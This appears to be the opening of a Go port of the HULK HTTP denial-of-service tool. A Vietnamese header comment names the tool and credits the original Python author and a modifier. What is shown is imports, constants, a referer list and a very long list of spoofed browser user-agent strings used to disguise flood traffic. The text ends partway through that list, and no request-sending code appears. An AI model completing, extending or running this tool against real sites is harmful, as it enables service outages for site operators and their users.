package main

/*
Công cụ HULK DoS trên các goroutines <strike> steroid </strike>. Chỉ được chuyển từ Python với một số cải tiến.
Tiện ích Python gốc của Barry Shteiman 

Chương trình cờ vây này được cấp phép theo GPLv3.
Phiên bản được cải tiến bởi Đậu Đậu
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__  = "4.3.2"

const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
//const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
	}
	headersUseragents []string = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
		"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; DUA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Mi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; moto g(10) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; moto g(10) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Nokia 5.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; RMX2205 Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; RMX3195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; RMX3350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; XQ-AT72 Build/58.1.A.5.530; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.145 Mobile Safari/537.36 huaweioem (8.1.0.388)",
		"Mozilla/5.0 (Linux; Android 11; XT2175-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; CPH2237) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M1908C3JGG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M1908C3JGG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M1908C3JGG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.26 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; 5041D Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; M-PPxB400) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Allure M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; LML211BL Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; CPH2015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; Mi MIX 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Vivaldi/3.7",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3534.111 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3536.35 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3512.162 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3536.137 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3519.53 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3533.161 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3528.49 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3511.7 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Herring/93.1.8770.71",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.81 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.26 Safari/537.36 Edg/101.0.1210.14",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3523.19 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3485.135 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3533.84 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3535.138 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3537.72 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3536.105 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3536.37 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3535.150 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.86",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 OPR/83.0.4254.27",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3459.111 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.44",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.57 Whale/3.14.133.23 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3536.86 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3533.161 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3522.98 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3514.70 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3528.131 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3505.80 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3536.26 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3518.33 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3529.90 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3521.131 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3536.40 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3516.17 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.42",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.2.648 Yowser/2.5 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.60",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2131.87 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3492.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3387.118 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3239.80 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3470.97 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3423.45 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3481.88 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3453.59 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3532.167 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3505.104 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3505.58 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3441.74 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3483.153 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3463.49 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3275.87 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3504.128 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3390.65 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3523.98 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3271.12 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3477.7 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3298.153 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3244.49 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3290.134 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3525.33 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2113.26 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3529.111 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3476.42 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3515.52 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3437.161 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3523.18 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3509.29 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3534.52 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3501.12 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3524.40 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3492.60 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3517.152 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3494.30 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3477.119 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3537.27 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3527.41 Safari/537.36",
